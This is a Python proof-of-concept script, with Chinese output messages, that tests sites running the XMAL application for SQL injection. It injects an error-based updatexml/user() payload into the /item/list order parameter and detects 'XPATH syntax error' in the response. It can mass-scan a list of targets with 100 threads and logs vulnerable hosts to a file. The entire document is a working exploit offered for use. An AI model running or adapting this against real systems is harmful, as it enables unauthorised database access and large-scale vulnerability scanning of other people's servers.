import requests,re,argparse,sys
from multiprocessing.dummy import Pool

def banner():
    test = """                                                            
____  ___  _____         .__  .__   
\   \/  / /     \ _____  |  | |  |  
 \     / /  \ /  \\__  \ |  | |  |  
 /     \/    Y    \/ __ \|  |_|  |__
/___/\  \____|__  (____  /____/____/
      \_/       \/     \/  
          version = 1.0         
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="XMAL存在sql注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="Please input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp =Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")
def poc(target):
	headers={
		'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7',
        'Connection': 'close'
	}
	proxies={
		'http':"http://127.0.0.1:7890",
		'https':"http://127.0.0.1:7890"
	}
	playload="/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136"
	try:
		response = requests.get(url=target+playload,headers=headers,verify=False)
		if response.status_code == 200 and 'XPATH syntax error' in response.text:      
			print(f"[+]该站点{target}存在sql注入漏洞")
			with open("result.txt","a") as fp:
				fp.write(f"{target}"+"\n")
		else:
			print(f"[-]该站点{target}不存在sql注入漏洞")
	except Exception as e:
		print(f"[*]该站点{target}存在访问问题，请手工测试")
if __name__ == "__main__":
    main()